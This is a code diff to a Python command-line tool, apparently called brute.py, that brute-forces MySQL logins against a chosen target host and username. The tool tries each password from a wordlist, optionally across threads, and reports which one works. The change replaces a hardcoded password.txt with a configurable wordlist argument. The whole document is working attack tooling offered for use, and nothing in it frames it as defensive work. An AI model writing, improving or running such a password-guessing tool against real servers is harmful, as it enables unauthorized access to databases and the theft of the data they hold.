@@ -3,11 +3,11 @@ from concurrent.futures import ThreadPoolExecutor as T
 import argparse
 
 class system:
-    def __init__(self, hosts, port, user, thread = 0):
+    def __init__(self, hosts, port, user, wordlist, thread = 0):
         self.hosts = hosts
         self.port = port
         self.user = user
-        self.proc(thread)
+        self.proc(wordlist, thread)
 
     def con(self, hosts, port, username, passwords):
         try:
@@ -25,24 +25,24 @@ class system:
         except mysql.connector.Error as err:
             return False
     
-    def open_list(self):
-        with open("password.txt", "r") as files:
+    def open_list(self, wordlist):
+        with open(wordlist, "r") as files:
             file = files.readlines()
             exp_file = [file.replace("\n", "") for file in file]
             return exp_file
     
-    def proc(self, thread = 0):
+    def proc(self, wordlist, thread = 0):
         try:
             if thread:
                 with T(max_workers=thread) as executor:
-                    for list in self.open_list():
+                    for list in self.open_list(wordlist):
                         if executor.submit(self.con, self.hosts, self.port, self.user, list).result() == False:
                             print(f"\033[33m{list} \033[37m=> \033[31mNot a password")
                         else:
                             print(f"\033[33m{list} \033[37m=> \033[32mThis is the password")
                             break
             else:
-                for list in self.open_list():
+                for list in self.open_list(wordlist):
                     if self.con(self.hosts, self.port, self.user, list) == False:
                         print(f"\033[33m{list} \033[37m=> \033[31mNot a password")
                     else:
@@ -50,6 +50,9 @@ class system:
                         break
         except KeyboardInterrupt:
             print("\033[37m[*] Exiting program...")
+        except FileNotFoundError:
+            print("\033[37m[*] File Wordlist Not Found!")
+            
 
 if __name__ == "__main__":
     print(""" __  __        _____  ____  _      ____  ______ 
@@ -67,9 +70,10 @@ python3 brute.py -h for help
     parser.add_argument("-H", "--hosts", help="Enter your host target", type=str, required=True)
     parser.add_argument("-u", "--username", help="Enter your username target", type=str, required=True)
     parser.add_argument("-p", "--port", help="Enter your port target (Default: 3306)", type=int, default=3306)
+    parser.add_argument("-wl", "--wordlist", help="Enter your wordlist password", type=str, default="password.txt")
     parser.add_argument("-t", "--thread", help="Enter your thread", type=int, default=0)
     args = parser.parse_args()
     if args.hosts and args.username and args.port:
-        system(args.hosts, args.port, args.username, args.thread)
+        system(args.hosts, args.port, args.username, args.wordlist, args.thread)
     else:
         print("python3 brute.py -h for help")
